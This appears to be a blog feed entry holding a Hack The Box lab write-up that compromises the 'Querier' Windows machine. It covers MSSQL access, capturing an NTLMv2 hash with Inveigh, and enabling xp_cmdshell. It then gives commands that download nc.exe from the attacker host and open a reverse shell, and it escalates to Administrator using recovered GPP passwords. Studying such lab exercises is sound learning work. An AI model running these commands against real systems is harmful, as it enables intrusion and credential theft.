/><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier-2</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier-2/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-this-is-the-second-post-for-querier-you-can-read-the-first-post-here-in-the-first-post-i-solved-it-with-kali-in-this-post-i-will-solve-it-with-commando-vm-queriers-ip-is-101010125-i-added-it-to-cwindowssystem32driversetchosts-as-querierhtb-lets-jump-right-in-&quot;&gt;Hey guys this is the second post for Querier, you can read the first post &lt;a href=&quot;/hack-the-box/querier&quot;&gt;here&lt;/a&gt;. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-we-dont-have-credentials-for-mssql-so-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. We don’t have credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; so let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-list-the-shares-we-can-do-that-using-net-view-&quot;&gt;We need to list the shares, We can do that using &lt;code class=&quot;highlighter-rouge&quot;&gt;net view&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net view querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-only-showed-us-reports-because-its-the-only-share-that-we-can-access-anonymously-which-is-nice&quot;&gt;It only showed us &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt; because it’s the only share that we can access anonymously which is nice.&lt;/h4&gt;
&lt;h4 id=&quot;we-can-mount-the-share-from-cmd-with-net-use-&quot;&gt;We can mount the share from &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;net use&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net use Z: \\querier.htb\Reports /persistent:yes&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-also-do-it-from-the-file-explorer-&quot;&gt;We can also do it from the file explorer :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
&lt;h4 id=&quot;i-used-olevba-to-get-credentials-from-the-excel-file-like-i-did-in-the-first-post-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; to get credentials from the excel file like I did in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-connect-to-the-mssql-server-i-will-use-heidisql-&quot;&gt;To connect to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server I will use &lt;a href=&quot;https://www.heidisql.com/&quot;&gt;HeidiSQL&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-authentication-failed-&quot;&gt;However, authentication failed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-windows-authentication-&quot;&gt;I tried windows authentication :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-it-also-failed-because-it-was-trying-as-guest-not-reporting-&quot;&gt;But it also failed because it was trying as guest not reporting :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-solve-this-we-can-use-runas-to-run-heidi-as-reporting-&quot;&gt;To solve this we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; as reporting :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\reporting cmd.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-the-new-cmd-session-i-ran-heidi-&quot;&gt;From the new &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; session I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-windows-authentication-worked-&quot;&gt;Now windows authentication worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;got-permission-denied-for-xp_cmdshell-&quot;&gt;Got permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-run-a-fake-smb-server-to-capture-credentials-using-a-tool-called-inveigh-which-works-like-responder-from-powershell-i-imported-inveigh-import-module-ctoolsinveighinveighps1-then-i-disabled-the-firewall-netsh-advfirewall-set-allprofiles-state-off-and-invoked-inveigh-invoke-inveigh--ip-1010xxxx--consoleoutput-y&quot;&gt;We can run a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; server to capture credentials using a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; which works like responder. From &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt; I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Import-Module C:\Tools\Inveigh\Inveigh.ps1&lt;/code&gt;). Then I disabled the firewall (&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh advfirewall set allprofiles state off&lt;/code&gt;) and invoked &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y&lt;/code&gt;).&lt;/h4&gt;
&lt;h4 id=&quot;from-heidi-i-used-xp_dirtree-&quot;&gt;From &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; I used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;inveigh-captured-the-ntlmv2-hash-for-mssql-svc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; captured the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-cracking-the-hash-on-another-box-the-password-is-corporate568-now-we-can-use-runas-to-run-heidi-as-mssql-svc-&quot;&gt;After cracking the hash on another box the password is &lt;code class=&quot;highlighter-rouge&quot;&gt;corporate568&lt;/code&gt;. Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;queries-to-enable-xp_cmdshell-&quot;&gt;Queries to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-we-got-rce-i-ran-a-python-server-to-host-ncexe-then-i-downloaded-it-on-the-box-and-got-a-reverse-shell-&quot;&gt;Great, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I downloaded it on the box and got a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe';
EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;as-i-said-in-the-first-post-when-i-checked-group-policy-passwords-i-found-administrators-password-there-are-privilege-escalation-enumeration-scripts-for-windows-like-linenumsh-for-linux-one-of-them-is-powerupps1-and-it-checks-for-group-policy-passwords-lets-check-that-one-&quot;&gt;As I said in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt;, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; for Linux one of them is &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powerup.ps1&lt;/code&gt;&lt;/a&gt; and it checks for group policy passwords. Let’s check that one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/23.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-also-decrypts-the-password-which-is-nice-password--myunclesaremarioandluigi1&quot;&gt;It also decrypts the password which is nice. Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-can-use-psexec-to-get-a-shell-as-administrator-i-used-runas-to-start-cmd-as-querieradministrator-then-i-used-psexec-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; to get a shell as Administrator. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to start &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;QUERIER\Administrator&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\Administrator cmd.exe&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec \\querier.htb cmd&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;first-write-up--hack-the-box---querier&quot;&gt;First write-up : &lt;a href=&quot;/hack-the-box/querier&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\Windows\System32\drivers\etc\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\querier.htb\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\Tools\Inveigh\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare' Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe'; EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337' We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\Administrator then I used psexec : runas /netonly /user:QUERIER\Administrator cmd.exe psexec \\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab Next Hack The Box write-up : Hack The Box - Netmon</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier-2/0.png" /></entry></feed>